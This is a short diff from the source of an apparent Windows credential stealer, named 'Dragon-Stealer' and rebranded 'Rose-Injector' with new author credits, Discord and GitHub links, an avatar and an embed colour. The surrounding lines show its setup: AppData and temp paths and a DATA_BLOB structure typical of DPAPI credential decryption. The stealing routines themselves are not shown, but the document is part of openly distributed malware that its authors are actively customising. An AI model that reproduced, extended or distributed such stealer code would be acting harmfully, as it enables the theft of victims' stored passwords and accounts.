@@ -66,9 +66,9 @@ local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 Threadlist = []
-footer = "Dragon-Stealer modified by Gumbobrot#4888 | https://github.com/Gumbobrot/"
-avatar = "https://i.imgur.com/82x4nYk.jpeg"
-color = 1578778
+footer = "Rose-Injector modified by [Gum](https://discord.com/users/1075072806892621874/), [pierro](https://discord.com/users/951401018065846372/) and [Websi](https://discord.com/users/716729476876206160/) | [GitHub](https://github.com/Gumbobrot/) | [Rose-Injector](https://github.com/Gum-s/Rose-Injector/)"
+avatar = "https://i.imgur.com/EZFAJXh.png"
+color = 16711680
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
